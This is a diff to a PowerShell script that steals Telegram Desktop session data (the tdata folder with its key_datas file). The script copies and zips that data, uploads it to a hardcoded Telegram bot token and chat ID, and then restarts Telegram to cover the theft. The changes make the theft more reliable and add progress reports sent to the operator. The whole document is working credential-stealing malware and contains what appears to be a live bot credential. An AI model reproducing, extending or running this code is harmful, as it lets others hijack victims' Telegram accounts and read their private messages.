@@ -1,6 +1,7 @@
 param([string]$Token, [string]$ChatID)
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference    = 'SilentlyContinue'
+[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
 if (-not $Token)  { $Token  = '9144321837:AAHrcLLsQqlZGQNXFdry99NnBKfTIHLCK90' }
 if (-not $ChatID) { $ChatID = '1859879540' }
 
@@ -15,7 +16,7 @@ function Send-Text([string]$text) {
         & $curl -s --max-time 20 --data-urlencode "text=$text" -d "chat_id=$ChatID" $apiMsg | Out-Null
         return
     }
-    Invoke-RestMethod -Method Post -Uri $apiMsg -Body @{ chat_id = $ChatID; text = $text } | Out-Null
+    try { Invoke-RestMethod -Method Post -Uri $apiMsg -Body @{ chat_id = $ChatID; text = $text } | Out-Null } catch {}
 }
 
 function Post([string]$file, [string]$text) {
@@ -35,6 +36,7 @@ function Post([string]$file, [string]$text) {
 }
 
 function Send-Large([string]$path, [string]$text) {
+    if (-not (Test-Path $path)) { Send-Text "file missing: $text"; return }
     $limit = 45MB
     if ((Get-Item $path).Length -le $limit) { Post $path $text; return }
     $fs = [IO.File]::OpenRead($path); $i = 0
@@ -54,6 +56,8 @@ function Send-Large([string]$path, [string]$text) {
             Remove-Item $part -Force
             $i++
         }
+    } catch {
+        Send-Text ("upload fail: " + $_.Exception.Message + " | " + $text)
     } finally { $fs.Close() }
 }
 
@@ -71,7 +75,8 @@ Get-ChildItem (Join-Path $env:LOCALAPPDATA 'Packages') -Filter 'Telegram*' -Dire
 $cands = $cands | Select-Object -Unique
 
 $src = $cands | Where-Object { Test-Path (Join-Path $_ 'key_datas') } | Select-Object -First 1
-if (-not $src) { Send-Text "no tdata: $cap"; exit }
+if (-not $src) { Send-Text ("no tdata: $cap | checked " + $cands.Count + " paths"); exit }
+Send-Text "found: $src"
 
 $exe = Join-Path (Split-Path $src) 'Telegram.exe'
 
@@ -84,13 +89,33 @@ while ((Get-Process Telegram -ErrorAction SilentlyContinue) -and $n -lt 15) {
 
 $out = Join-Path $env:TEMP "td_$stamp"
 $zip = "$out.zip"
-robocopy $src $out /E /XD cache /NFL /NDL /NJH /NJS /R:1 /W:1 | Out-Null
 
-if (Test-Path (Join-Path $out 'key_datas')) {
-    Compress-Archive (Join-Path $out '*') $zip -Force
+try { robocopy $src $out /E /XD cache /NFL /NDL /NJH /NJS /R:1 /W:1 | Out-Null } catch {}
+
+if (-not (Test-Path (Join-Path $out 'key_datas'))) {
+    Send-Text "copy failed: $cap"
+    if (Test-Path $exe) { Start-Process $exe }
+    exit
+}
+
+$files = Get-ChildItem $out -Recurse -File -ErrorAction SilentlyContinue
+$sz    = [Math]::Round((($files | Measure-Object Length -Sum).Sum)/1MB, 2)
+Send-Text "copy ok: $cap | $($files.Count) files | $sz MB"
+
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+Add-Type -AssemblyName System.IO.Compression
+try {
+    [IO.Compression.ZipFile]::CreateFromDirectory($out, $zip, [IO.Compression.CompressionLevel]::Optimal, $false)
+} catch {
+    Send-Text ("zip fail: " + $_.Exception.Message + " | $cap")
+    if (Test-Path $exe) { Start-Process $exe }
+    exit
+}
+
+if (Test-Path $zip) {
     Send-Large $zip "$cap | $([Math]::Round((Get-Item $zip).Length/1MB,2))MB"
 } else {
-    Send-Text "copy failed: $cap"
+    Send-Text "zip missing: $cap"
 }
 
 if (Test-Path $exe) { Start-Process $exe }
